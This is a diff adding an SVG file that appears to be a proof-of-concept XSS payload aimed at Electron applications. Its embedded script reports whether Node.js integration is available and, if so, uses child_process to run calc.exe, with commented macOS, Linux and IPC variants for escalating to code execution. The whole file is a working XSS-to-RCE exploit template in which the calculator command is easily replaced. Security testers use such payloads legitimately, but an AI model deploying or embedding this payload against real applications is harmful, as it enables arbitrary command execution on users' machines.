@@ -1,0 +1,19 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <rect width="100%" height="100%" fill="red"/>
+  <script type="text/javascript">
+    // XSS Payload (Test with alert)
+    alert(`Electron App XSS: ${window.process.versions.electron ? 'Node.js Enabled' : 'Sandboxed'}`);
+
+    // If Node.js integration is enabled (nodeIntegration=true), attempt RCE
+    if (window.process?.versions?.electron) {
+      const { exec } = require('child_process');
+      // Replace with OS-specific commands (example: open calculator)
+      exec('calc.exe'); // Windows
+      // exec('open -a Calculator'); // macOS
+      // exec('xcalc'); // Linux
+    }
+
+    // If contextIsolation is enabled, use exposed IPC methods (if available)
+    // window.electronIPC.send('rce', 'calc.exe');
+  </script>
+</svg>
